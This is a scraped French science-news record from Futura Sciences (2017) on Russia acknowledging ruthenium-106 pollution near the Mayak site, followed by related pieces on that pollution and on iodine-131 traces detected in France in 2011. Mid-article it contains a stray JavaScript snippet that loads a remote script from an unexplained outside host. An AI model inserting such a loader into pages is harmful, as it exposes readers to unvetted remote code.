{"title": "La pollution radioactive au ruthénium 106 reconnue par la Russie", "newspaper": "Futura Sciences", "author": "Par Futura avec l'AFP", "date_publi": "21/11/2017", "content": "L'agence de météorologie russe a reconnu qu'une concentration inhabituelle de ruthénium 106 avait été détectée fin septembre dans plusieurs régions de Russie. Celle-ci proviendrait d'un site de retraitement des combustibles nucléaires. Ce qu'il faut retenir Du ruthénium 106 a été détecté en Europe fin septembre. Ce radionucléide artificiel proviendrait du site de retraitement de Maïak, où une catastrophe nucléaire a eu lieu en 1957. Greenpeace demande une enquête pour dissimulation d'accident nucléaire car la Russie avait d'abord nié être responsable. L'agence russe de météorologie Rosguidromet a reconnu lundi qu'une concentration  « extrêmement élevée »  de  ruthénium  106 avait été détectée fin septembre dans plusieurs régions de Russie, confirmant les rapports de plusieurs réseaux européens de surveillance de la  radioactivité . Selon Rosguidromet, la concentration la plus élevée a été enregistrée par la station d'Arguaïach, un village du sud de l'Oural situé à 30 kilomètres du complexe nucléaire Maïak, touché par un des pires accidents nucléaires de l'histoire en 1957 et servant aujourd'hui de site de retraitement de  combustible   nucléaire  usé. « Le radio-isotope Ru 106 a été détecté par les stations d'observation d'Arguaïach et de Novogorny »  entre le 25 septembre et le 1 er  octobre, précise l'agence russe dans un communiqué, ajoutant qu'à Arguaïach,  « une concentration extrêmement élevée »  de ruthénium 106,  « excédant de 986 fois »  les taux enregistrés le mois précédent, a été détectée. “ Greenpeace va envoyer une lettre au parquet pour demander l'ouverture d'une enquête sur la dissimulation éventuelle d'un incident nucléaire. Ces deux stations sont situées dans le sud de l'Oural, près de la ville de Tcheliabinsk, proche de la frontière avec le Kazakhstan. L'agence russe précise que le ruthénium 106 a ensuite été détecté au Tatarstan puis dans le sud de la Russie, avant qu'il ne se fixe à partir du 29 septembre  « dans tous les pays européens, à partir de l'Italie et vers le nord de l'Europe ». Dans un communiqué,  Greenpeace Russie  a appelé Rosatom, la société d'État russe qui gère l'activité de toutes les entreprises du secteur nucléaire en Russie, à  « mener une enquête approfondie et à publier des données sur les évènements arrivés à Maïak ». Ce communiqué, publié sur le site Internet de l'association, ajoute que  « Greenpeace va envoyer une lettre au parquet pour demander l'ouverture d'une enquête sur la dissimulation éventuelle d'un incident nucléaire ». Le site de Maïak a connu un grave accident nucléaire en 1957. © Ecodefense, Heinrich Boell Stiftung Russia, Slapovskaya, Nikulina                               La radioactivité avait été détectée en France par l'IRSN Mi-octobre, Rosatom avait assuré dans un communiqué cité par les médias russes :  « Dans les échantillons relevés du 25 septembre au 7 octobre, y compris dans le sud de l'Oural, aucune trace de ruthénium 106 n'a été découverte à part à Saint-Pétersbourg » , rejetant les conclusions des réseaux européens de surveillance de la radioactivité.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Fin septembre, plusieurs réseaux européens de surveillance de la radioactivité avaient repéré du ruthénium 106 dans l' atmosphère . L'Institut de radioprotection et de sûreté nucléaire (IRSN) français avait ensuite indiqué, après une enquête, que  « la zone de rejet la plus plausible se situe entre la Volga et l'Oural » , sans être en mesure de préciser la localisation exacte du point de rejet. L'IRSN précisait que la source de la pollution ne pouvait provenir d'un réacteur nucléaire, car d'autres éléments radioactifs auraient été détectés, et faisait  « l'hypothèse d'un rejet issu d'une installation »  liée au cycle du combustible nucléaire ou de fabrication de sources radioactives. Le ruthénium 106 est un produit de  fission  issu de l'industrie nucléaire, par ailleurs utilisé pour des traitements médicaux.  « Les niveaux de concentration dans l' air  en ruthénium 106 qui ont été relevés en Europe et  a fortiori  en France sont sans conséquence tant pour la santé humaine que pour l'environnement » , a noté l'IRSN. Depuis la  catastrophe nucléaire de Tchernobyl , en Ukraine soviétique, en 1986, qui avait contaminé une bonne partie de l'Europe, les craintes de l'Occident sur la sécurité des installations nucléaires soviétiques puis russes n'ont jamais été levées. Pour en savoir plus Une pollution radioactive au ruthénium 106 détectée en Europe Article de Futura avec l'AFP paru le 13 novembre 2017 Une pollution radioactive a été détectée en Europe à la fin du mois de septembre. D'après l'Institut de radioprotection et de sûreté nucléaire (IRSN) français, elle proviendrait d'une zone située entre la Volga et l'Oural, mais les autorités russes nient toute responsabilité. Une pollution radioactive détectée en Europe à la fin du mois de septembre aurait son origine  « entre la Volga et l'Oural »  selon l'institut public français, mais les autorités russes ont nié vendredi toute responsabilité. Du ruthénium 106 avait été détecté dès fin septembre par plusieurs réseaux européens de surveillance de la radioactivité dans l'atmosphère. « La zone de rejet la plus plausible se situe entre la Volga et l'Oural, sans qu'il ne soit possible, avec les données disponibles, de préciser la localisation exacte du point de rejet » , estime dans une note l' Institut de radioprotection et de sûreté nucléaire  (IRSN) français au terme de son enquête. Selon la même source, la pollution ne peut pas provenir d'un réacteur nucléaire, car d'autres éléments radioactifs auraient été alors détectés. Le saviez-vous ? Le ruthénium 106 est un radionucléide d’origine artificielle, absent dans l’air en temps normal.  L'IRSN précise avoir du coup  « fait l'hypothèse d'un rejet issu d'une installation »  liée au cycle du combustible nucléaire ou de fabrication de sources radioactives, sans identifier un site en particulier. Le ruthénium 106 est un produit de fission issu de l'industrie nucléaire, par ailleurs utilisé pour des traitements médicaux. La France a  « entrepris des démarches diplomatiques » , indique-t-on au ministère de la Transition écologique, mais le mystère reste entier : aucun pays n'a déclaré à l'Agence internationale de l' énergie  atomique (AIEA) être à l'origine de ce rejet. Des techniciens de l'IRSN près du panneau de contrôle du simulateur lors d'un exercice de sécurité nucléaire à la centrale nucléaire de Civaux, le 22 septembre 2015. © Guillaume Souvant, AFP/Archives                               En Russie, les entreprises du nucléaire plaident non-coupables « Les niveaux de concentration dans l'air en ruthénium 106 qui ont été relevés en Europe et a fortiori en France sont sans conséquence tant pour la santé humaine que pour l'environnement » , note l'IRSN. Le gouvernement précise de son côté avoir, par précaution, réalisé des  « contrôles par sondage sur les  champignons  importés des pays concernés, qui n'ont révélé aucune  contamination  à ce jour » . Les champignons sont en effet un aliment particulièrement à risque.  « Si une quelconque contamination était détectée, les mesures appropriées seraient ainsi immédiatement prises et feraient alors l'objet d'une communication dans un objectif de complète  transparence  » , assure le ministère. “ Depuis le 13 octobre, le ruthénium 106 n'est plus détecté en France Selon l'IRSN, une quantité  « très importante »  de ruthénium 106 a probablement été rejetée dans la zone d'origine mais seules des « traces » ont été détectées en France entre fin septembre et début octobre.  « Depuis le 13 octobre, le ruthénium 106 n'est plus détecté en France » , note l'IRSN, qui dispose d'un réseau de stations de surveillance de l'atmosphère. « Les entreprises de Rosatom n'ont rien à voir avec la fuite du ruthénium 106 »  détectée en Europe, a de son côté affirmé à l'AFP le service de presse de la société d'État russe, qui gère l'activité de toutes les entreprises du secteur nucléaire — militaires et civiles — en Russie. La société kazakhe Kazatomprom, opérateur national chargé de la production du combustible nucléaire, a également démenti être à l'origine de la fuite.  « Il n'y a pas de sites au Kazakhstan d'où une éventuelle fuite de cette substance pourrait se produire » , a assuré le service de presse de Kazatomprom. Avec AFP Un vent d’iode 131 radioactif venu de l’est, inoffensif mais mystérieux Article de  Jean-Luc Goudet  paru le 15 novembre 2011 L'IRSN a détecté des traces d'iode-131, pour l'instant dans le nord de la France et en région parisienne, après avoir été alerté par des scientifiques tchèques. Les taux sont très faibles et sans effet sur la santé humaine mais ces traces sont tout à fait inhabituelles. «  Quelque chose s'est passé quelque part  » nous explique un responsable de l'IRSN. Au début du mois de novembre, des scientifiques tchèques ont noté des traces d'iode-131 dans l'atmosphère et ont alerté leurs collègues en Europe. Le 11 novembre, l'AIEA ( International Atomic Energy Agency ) relayait l'information dans un communiqué, parlant de « taux très bas ». L'iode-131 n'est pas radioactif longtemps puisque sa demi-période est de 8 jours, c'est-à-dire que sa  radioactivité  diminue de moitié les huit premiers jours (pour descendre ensuite plus lentement). Il est habituellement totalement absent dans l'atmosphère et son origine est humaine. Les  centrales nucléaires  en génèrent mais il reste alors confiné dans l'installation. D'autres sources de production existent pour alimenter le secteur médical, qui l'utilise en  radiothérapie . Après cette alerte, en France, l'IRSN (Institut de radioprotection et de sûreté nucléaire) a «  renforcé sa vigilance  », et publie d'ailleurs un communiqué sur la  détection de l'iode-131  et un rapport indiquant les  niveaux de radioactivité  découverte, rendus publics sur le  Web . «  \"Renforcer la vigilance\" signifie que nous avons utilisé des installations de collectes d' aérosols  à grand  débit , normalement destinées à des activités de recherche, pour mesurer spécifiquement cet élément  » explique à Futura-Sciences Didier Champion, responsable Environnement et intervention de l'institut. Un moment clé de la spectrométrie gamma : Sébastien Aubry, du LMRE (Laboratoire de mesure de la radioactivité dans l'environnement) place un échantillon en compactage sur un détecteur Ge (Germanium) dans la chambre blindée du LMRE. © Rodolfo Gurriaran/IRSN                               Il faut en effet un débit d'air très important afin de capter suffisamment d'aérosols pour détecter des radioactivités très faibles, en dessous du seuil de détection des instruments à  charbon  actif, de petites dimensions. Ces équipements « TGD » (très grand débit) du réseau Opera-Air avalent plusieurs centaines de mètres cubes par jour. Les filtres sont retirés puis analysés par  spectrométrie   gamma  en principe 5 à 6 jours plus tard, pour laisser décroître l'activité des  radionucléides  naturels à vie courte. Pour mesurer ce pic inattendu d'iode-131, l'IRSN a effectué les mesures immédiatement après le prélèvement. Des niveaux à la limite des seuils de détection Des traces ont été détectées en région parisienne et dans le Nord de la France, à Charleville-Mézières et à  Bures . Pour l'instant, ces traces sont extrêmement faibles, de l'ordre de quelques microbecquerels par mètre cube (µBq/m 3 ). Les valeurs indiquées par l'IRSN pour ses prélèvements terminés les 9 et 10 novembre) sont de : 5,7 µBq/m 3  à Charleville-Mézières ; 4,9 µBq/m 3  à Orsay (Essonne) ; 12 µBq/m 3  au Vésinet (Essonne) ; 0,79 µBq/m 3  à Bure (Meuse), mais sur des mesures effectuées du 2 au 7 novembre. Ces niveaux ne représentent aucun risque pour la santé humaine ni pour l'environnement. L'IRSN poursuit ses mesures dans d'autres régions et tentent de remonter la piste pour comprendre d'où vient cette effluve. On pense bien sûr à la  centrale Daiishi de Fukushima  mais la courte vie de l'iode-131 exclut cette hypothèse. Il faudrait un dégagement très récent et massif, les taux mesurés aujourd'hui étant cent fois plus faibles que ceux relevés à l'époque de l'accident de Fukushima. «  La source est en Europe centrale ou de l'est, mais nous ne savons pas où , résume Didier Champion.  Les pays touchés ne l'ont pas forcément mesuré et le pays d'origine ne le sait pas forcément ou ne l'a pas encore dit. Mais quelque chose s'est passé quelque part en Europe centrale ou de l'Est début novembre.  » L'origine peut être un incident dans une  centrale nucléaire  ou bien dans une installation de production d' iode  131 à fins médicales. «  Un rejet d'iode radioactif est déjà survenu en Belgique en 2008  » rappelle Didier Champion, faisant référence à un incident à la centrale de Fleurus. L'enquête continue donc et on attend des informations venues d'autres pays qui pourront aider à remonter la piste de l'iode 131... Predator, le robot qui peut démanteler une centrale nucléaire                       Pour démanteler le réacteur nucléaire A de la centrale de Chooz, dans les Ardennes, des robots, en fait, des appareils téléopérés, découpent des pièces métalliques pour les extraire de la structure. Ils s'attaquent aux éléments irradiés et entameront bientôt la découpe de la cuve elle-même.                                       ", "theme": "planete"}